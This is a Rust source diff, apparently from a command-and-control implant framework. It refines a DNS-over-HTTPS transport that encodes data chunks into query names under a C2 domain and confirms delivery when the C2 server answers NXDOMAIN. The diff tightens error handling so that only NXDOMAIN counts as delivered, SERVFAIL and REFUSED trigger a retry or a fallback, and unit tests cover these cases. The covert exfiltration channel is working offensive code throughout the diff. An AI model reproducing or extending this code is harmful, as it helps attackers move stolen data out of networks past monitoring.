@@ -123,21 +123,23 @@ impl DohTransport {
         for (seq, chunk) in chunks.iter().enumerate() {
             let name = format!("{}.{seq:04x}{total:04x}.{session}.u.{}", chunk, self.c2_domain);
             trace!(seq, name = %name, "DoH uplink chunk");
-            // DNS-level NXDOMAIN is expected and non-fatal: the authoritative C2
-            // server receives the encoded chunk in the query *name* and deliberately
-            // returns NXDOMAIN (there is no real record to return).  The chunk was
-            // delivered as long as the DoH resolver successfully forwarded the query.
+            // NXDOMAIN is expected and non-fatal: the authoritative C2 server
+            // receives the encoded chunk in the query *name* and deliberately
+            // returns NXDOMAIN (there is no real DNS record to return).  The chunk
+            // was delivered as long as the DoH resolver successfully forwarded the
+            // query and the authoritative server responded with NXDOMAIN.
             //
-            // HTTP transport errors (connection failure, timeout, HTTP 4xx/5xx) are
-            // fatal for this chunk: the query never reached the resolver, so the
-            // chunk was never forwarded.  We retry once to handle transient issues;
-            // if the retry also fails with a transport error we propagate the error
-            // so the caller (e.g. FallbackTransport) can switch to an alternate path
-            // before the uplink is declared complete.
+            // Resolver-side DNS failures (SERVFAIL, REFUSED, etc.) are treated as
+            // transport failures because the query may never have reached the
+            // authoritative C2 server.  HTTP transport errors (connection failure,
+            // timeout, HTTP 4xx/5xx) are also fatal for this chunk.  We retry once
+            // to handle transient issues; if the retry also fails we propagate the
+            // error so the caller (e.g. FallbackTransport) can switch to an
+            // alternate path before the uplink is declared complete.
             if let Err(e) = self.txt_query(&name).await {
                 if is_dns_level_error(&e) {
                     // NXDOMAIN from the authoritative server — chunk was delivered.
-                    trace!(seq, "DoH uplink chunk {seq}: DNS-level NXDOMAIN (expected, non-fatal)");
+                    trace!(seq, "DoH uplink chunk {seq}: NXDOMAIN (expected, non-fatal)");
                 } else {
                     // Transport-level failure — chunk may not have been delivered.
                     warn!(seq, err = %e, "DoH uplink chunk {seq} transport error, retrying once");
@@ -149,7 +151,7 @@ impl DohTransport {
                             )));
                         }
                         // Retry got NXDOMAIN — chunk was delivered on retry.
-                        trace!(seq, "DoH uplink chunk {seq}: delivered on retry (DNS NXDOMAIN)");
+                        trace!(seq, "DoH uplink chunk {seq}: delivered on retry (NXDOMAIN)");
                     }
                 }
             }
@@ -263,19 +265,18 @@ impl DohTransport {
 // Error classification
 // ──────────────────────────────────────────────────────────────────────────────
 
-/// Returns `true` when `err` represents a DNS-level non-zero status code
-/// (e.g. NXDOMAIN, SERVFAIL) reported by the DoH resolver.
+/// Returns `true` when `err` is the intentional NXDOMAIN response from the
+/// authoritative C2 server, confirming that the uplink chunk was delivered.
 ///
-/// A DNS-level error means the HTTP exchange with the DoH resolver **succeeded**
-/// and the resolver forwarded the query to the authoritative server.  For
-/// uplink chunks the authoritative C2 server returns NXDOMAIN intentionally,
-/// so this kind of error is non-fatal: the chunk was delivered.
+/// Only NXDOMAIN (DNS status 3) is treated as a delivery confirmation.
+/// Resolver-side failures such as SERVFAIL (status 2) or REFUSED (status 5)
+/// do NOT confirm delivery — the query may have been dropped before reaching
+/// the authoritative C2 server — and therefore return `false`.
 ///
-/// Returns `false` for HTTP transport errors (connection refused, timeout,
-/// HTTP 4xx/5xx, body read failure).  In those cases the query never reached
-/// the resolver and the chunk was **not** forwarded.
+/// Returns `false` for all HTTP transport errors (connection refused, timeout,
+/// HTTP 4xx/5xx, body read failure) as well.
 fn is_dns_level_error(err: &SpecterError) -> bool {
-    matches!(err, SpecterError::Transport(msg) if msg.contains("DNS status"))
+    matches!(err, SpecterError::Transport(msg) if msg == "DoH: NXDOMAIN")
 }
 
 // ──────────────────────────────────────────────────────────────────────────────
@@ -360,15 +361,27 @@ fn generate_session_hex() -> String {
 
 /// Parse TXT record data strings from a DoH JSON API response body.
 ///
-/// Returns `Err` for NXDOMAIN (`Status != 0`) or JSON parse failures.
-/// Returns an empty `Vec` when the answer section is absent.
+/// Returns `Err` for non-zero DNS status codes or JSON parse failures.
+/// NXDOMAIN (`Status == 3`) is the intentional C2 server response for uplink
+/// chunk queries; all other non-zero status codes represent resolver-side
+/// failures that did not necessarily reach the authoritative server.
+/// Returns an empty `Vec` when the answer section is absent (Status 0, no records).
 fn parse_doh_txt_records(body: &str) -> Result<Vec<String>, String> {
-    // Status field — NXDOMAIN = 3.
+    // Status field — NXDOMAIN = 3, SERVFAIL = 2, NOERROR = 0.
     let status = json_u64_field(body, "Status")
         .ok_or_else(|| format!("DoH: missing 'Status' field in response: {body}"))?;
 
-    if status != 0 {
-        return Err(format!("DoH: DNS status {status} (NXDOMAIN or error)"));
+    if status == 3 {
+        // NXDOMAIN — the C2 authoritative server intentionally returns NXDOMAIN
+        // for uplink chunk queries (there is no real DNS record to return).
+        // Use a distinct error message so callers can recognize this as a
+        // delivery confirmation and not a resolver-side failure.
+        return Err("DoH: NXDOMAIN".to_string());
+    } else if status != 0 {
+        // Any other non-zero status (SERVFAIL=2, REFUSED=5, NOTIMPL=4, …) is a
+        // resolver-side failure.  The query may never have reached the
+        // authoritative C2 server, so the chunk must NOT be treated as delivered.
+        return Err(format!("DoH: DNS error status {status}"));
     }
 
     // Extract the Answer array's "data" fields where "type" == 16 (TXT).
@@ -579,7 +592,30 @@ mod tests {
     fn parse_doh_txt_records_nxdomain() {
         let body = r#"{"Status":3,"TC":false,"RD":true,"RA":true,"AD":false}"#;
         let err = parse_doh_txt_records(body).unwrap_err();
-        assert!(err.contains('3'), "error should mention status 3, got: {err}");
+        assert_eq!(err, "DoH: NXDOMAIN", "NXDOMAIN must use the dedicated message");
+    }
+
+    #[test]
+    fn parse_doh_txt_records_servfail_is_error() {
+        // SERVFAIL (status 2) is a resolver-side failure, not a delivery confirmation.
+        let body = r#"{"Status":2,"TC":false,"RD":true,"RA":true,"AD":false}"#;
+        let err = parse_doh_txt_records(body).unwrap_err();
+        assert!(
+            err.contains("DNS error status 2"),
+            "SERVFAIL must produce a 'DNS error status' message, got: {err}"
+        );
+        assert!(!err.contains("NXDOMAIN"), "SERVFAIL must not be reported as NXDOMAIN, got: {err}");
+    }
+
+    #[test]
+    fn parse_doh_txt_records_refused_is_error() {
+        // REFUSED (status 5) is also a resolver-side failure.
+        let body = r#"{"Status":5,"TC":false}"#;
+        let err = parse_doh_txt_records(body).unwrap_err();
+        assert!(
+            err.contains("DNS error status 5"),
+            "REFUSED must produce a 'DNS error status' message, got: {err}"
+        );
     }
 
     #[test]
@@ -669,15 +705,24 @@ mod tests {
 
     #[test]
     fn dns_level_error_detects_nxdomain_message() {
-        let err = SpecterError::Transport("DoH: DNS status 3 (NXDOMAIN or error)".to_string());
+        // The NXDOMAIN delivery-confirmation message must be recognized.
+        let err = SpecterError::Transport("DoH: NXDOMAIN".to_string());
         assert!(is_dns_level_error(&err));
     }
 
     #[test]
-    fn dns_level_error_detects_servfail_message() {
-        // SERVFAIL is DNS status 2; still a DNS-level response, chunk was forwarded.
-        let err = SpecterError::Transport("DoH: DNS status 2 (NXDOMAIN or error)".to_string());
-        assert!(is_dns_level_error(&err));
+    fn dns_level_error_rejects_servfail() {
+        // SERVFAIL (status 2) is a resolver-side failure, NOT a delivery confirmation.
+        // The old code incorrectly treated this as a non-fatal DNS-level error.
+        let err = SpecterError::Transport("DoH: DNS error status 2".to_string());
+        assert!(!is_dns_level_error(&err));
+    }
+
+    #[test]
+    fn dns_level_error_rejects_refused() {
+        // REFUSED (status 5) is also a resolver-side failure.
+        let err = SpecterError::Transport("DoH: DNS error status 5".to_string());
+        assert!(!is_dns_level_error(&err));
     }
 
     #[test]
